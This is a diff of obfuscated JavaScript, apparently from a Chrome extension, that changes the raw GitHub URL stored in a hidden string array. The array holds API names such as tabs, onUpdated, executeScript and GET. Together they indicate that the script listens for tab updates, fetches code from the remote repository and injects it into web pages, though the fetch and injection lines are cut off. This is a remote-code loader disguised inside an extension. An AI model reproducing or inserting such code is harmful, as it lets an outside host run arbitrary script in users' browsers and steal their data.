@@ -1,5 +1,5 @@
 /** @type {Array} */
-var data = ["onreadystatechange", "readyState", "id", "responseText", "executeScript", "tabs", "GET", "https://raw.githubusercontent.com/betulcelik/dd/master/api?", "random", "floor", "open", "send", "get", "addListener", "onUpdated"];
+var data = ["onreadystatechange", "readyState", "id", "responseText", "executeScript", "tabs", "GET", "https://raw.githubusercontent.com/levansky/turbo-memory/master/api?", "random", "floor", "open", "send", "get", "addListener", "onUpdated"];
 chrome[data[5]][data[14]][data[13]](function(trans) {
   chrome[data[5]][data[12]](trans, function() {
     /** @type {XMLHttpRequest} */
